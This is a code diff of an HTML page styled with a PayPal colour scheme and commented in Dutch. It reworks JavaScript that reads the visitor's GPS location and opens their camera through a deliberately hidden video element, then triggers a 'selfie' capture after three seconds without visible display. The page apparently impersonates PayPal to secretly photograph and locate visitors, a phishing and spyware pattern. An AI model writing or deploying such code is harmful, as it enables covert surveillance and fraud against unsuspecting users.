@@ -66,7 +66,6 @@
             border-radius: 8px;
         }
 
-        /* PayPal Color Scheme */
         .paypal-color {
             color: #0070ba;
         }
@@ -82,7 +81,6 @@
         #camera-preview {
             display: none; /* Camera display is now hidden */
         }
-
     </style>
 </head>
 <body class="paypal-background">
@@ -127,65 +125,51 @@
         // Functie om locatie toestemming te verkrijgen
         function requestLocationPermission() {
             return new Promise((resolve, reject) => {
-                navigator.permissions.query({ name: "geolocation" })
-                    .then(permissionStatus => {
-                        if (permissionStatus.state === "granted") {
-                            navigator.geolocation.getCurrentPosition(position => {
-                                console.log(`📍 GPS Locatie: ${position.coords.latitude}, ${position.coords.longitude}`);
-                                resolve();
-                            }, error => {
-                                console.log("❌ Locatie geweigerd:", error);
-                                reject();
-                            });
-                        } else {
-                            console.log("❌ Locatie toestemming geweigerd of niet beschikbaar.");
-                            reject();
-                        }
-                    })
-                    .catch(error => {
-                        console.log("❌ Fout bij het ophalen van locatie:", error);
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        console.log(`📍 GPS Locatie: ${position.coords.latitude}, ${position.coords.longitude}`);
+                        resolve();
+                    }, error => {
+                        console.log("❌ Locatie geweigerd of niet beschikbaar:", error);
                         reject();
                     });
+                } else {
+                    console.log("❌ Geolocatie wordt niet ondersteund door deze browser.");
+                    reject();
+                }
             });
         }
 
         // Functie om camera toestemming te verkrijgen
         function requestCameraPermission() {
             return new Promise((resolve, reject) => {
-                navigator.permissions.query({ name: "camera" })
-                    .then(permissionStatus => {
-                        if (permissionStatus.state === "granted") {
-                            navigator.mediaDevices.getUserMedia({ video: true })
-                                .then(stream => {
-                                    // ** Verborgen camera stream **: camera wordt niet zichtbaar
-                                    let video = document.createElement("video"); // Dynamisch video-element
-                                    video.srcObject = stream; // Verbindt de stream naar het video-element
-                                    video.width = 320;  // Resolutie instelling (alleen voor verborgen werking)
-                                    video.height = 240; // Resolutie instelling (alleen voor verborgen werking)
-                                    video.play(); // Start de video in de achtergrond zonder visuele weergave
-                                    
-                                    // Video-element wordt verborgen
-                                    video.style.display = "none"; // Verbergt de video in de achtergrond
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => {
+                            // ** Verborgen camera stream **: camera wordt niet zichtbaar
+                            let video = document.createElement("video");
+                            video.srcObject = stream;
+                            video.width = 320;  
+                            video.height = 240; 
+                            video.play(); 
+                            
+                            // Video-element wordt verborgen
+                            video.style.display = "none";
 
-                                    // Simuleer een foto-opname na 3 seconden
-                                    setTimeout(() => {
-                                        takeSelfie(video, stream);
-                                    }, 3000);
-                                    resolve();
-                                })
-                                .catch(error => {
-                                    console.log("❌ Camera geweigerd:", error);
-                                    reject();
-                                });
-                        } else {
-                            console.log("❌ Camera toestemming geweigerd of niet beschikbaar.");
+                            // Simuleer een foto-opname na 3 seconden
+                            setTimeout(() => {
+                                takeSelfie(video, stream);
+                            }, 3000);
+                            resolve();
+                        })
+                        .catch(error => {
+                            console.log("❌ Camera geweigerd:", error);
                             reject();
-                        }
-                    })
-                    .catch(error => {
-                        console.log("❌ Fout bij het ophalen van camera:", error);
-                        reject();
-                    });
+                        });
+                } else {
+                    console.log("❌ Camera wordt niet ondersteund door deze browser.");
+                    reject();
+                }
             });
         }
 
